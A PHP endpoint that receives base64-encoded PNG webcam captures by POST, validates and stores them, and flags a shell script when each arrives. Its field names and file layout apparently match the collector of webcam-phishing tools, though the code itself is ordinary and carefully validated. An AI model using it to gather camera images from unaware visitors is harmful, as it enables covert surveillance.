<?php

header('Content-Type: application/json; charset=UTF-8');
header('X-Content-Type-Options: nosniff');
header('Cache-Control: no-store, no-cache, must-revalidate');

$maxBase64Length = 8 * 1024 * 1024; // Reject oversized payloads before decode.

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
    exit;
}

$date = date('Ymd_His') . '_' . substr(bin2hex(random_bytes(3)), 0, 6);
$imageData = $_POST['cat'] ?? '';

if (empty($imageData)) {
    http_response_code(422);
    echo json_encode(['status' => 'error', 'message' => 'No image data']);
    exit;
}

/* ── Central data directory ── */
$data_dir      = dirname(__DIR__) . '/data';
$captures_dir  = $data_dir . '/camera_captures';

if (!is_dir($data_dir)) {
    mkdir($data_dir, 0750, true);
}
if (!is_dir($captures_dir)) {
    mkdir($captures_dir, 0750, true);
}

/* Validate and extract base64 payload */
$imageData = trim((string) $imageData);
$isExpectedPrefix = strpos($imageData, 'data:image/png;base64,') === 0
    || strpos($imageData, 'data:image/octet-stream;base64,') === 0;

if (!$isExpectedPrefix) {
    http_response_code(422);
    echo json_encode(['status' => 'error', 'message' => 'Unsupported image format']);
    exit;
}

$commaPos = strpos($imageData, ',');
if ($commaPos === false) {
    http_response_code(422);
    echo json_encode(['status' => 'error', 'message' => 'Invalid image format']);
    exit;
}

$filteredData  = substr($imageData, $commaPos + 1);
if ($filteredData === '' || strlen($filteredData) > $maxBase64Length) {
    http_response_code(413);
    echo json_encode(['status' => 'error', 'message' => 'Image payload too large']);
    exit;
}

$unencodedData = base64_decode($filteredData, true);

if ($unencodedData === false) {
    http_response_code(422);
    echo json_encode(['status' => 'error', 'message' => 'Invalid base64 data']);
    exit;
}

if (substr($unencodedData, 0, 8) !== "\x89PNG\r\n\x1a\n") {
    http_response_code(422);
    echo json_encode(['status' => 'error', 'message' => 'Invalid PNG data']);
    exit;
}

$filepath = $captures_dir . '/cam' . $date . '.png';
$fp = fopen($filepath, 'wb');
if (!$fp) {
    http_response_code(500);
    echo json_encode(['status' => 'error', 'message' => 'Unable to save image']);
    exit;
}

flock($fp, LOCK_EX);
$written = fwrite($fp, $unencodedData);
flock($fp, LOCK_UN);
fclose($fp);

if ($written === false || $written < strlen($unencodedData)) {
    @unlink($filepath);
    http_response_code(500);
    echo json_encode(['status' => 'error', 'message' => 'Unable to save image']);
    exit;
}

@chmod($filepath, 0640);

/* ── Signal shell script that a new capture arrived ── */
file_put_contents($data_dir . '/.flag_cam', $filepath);

echo json_encode(['status' => 'success']);
exit;
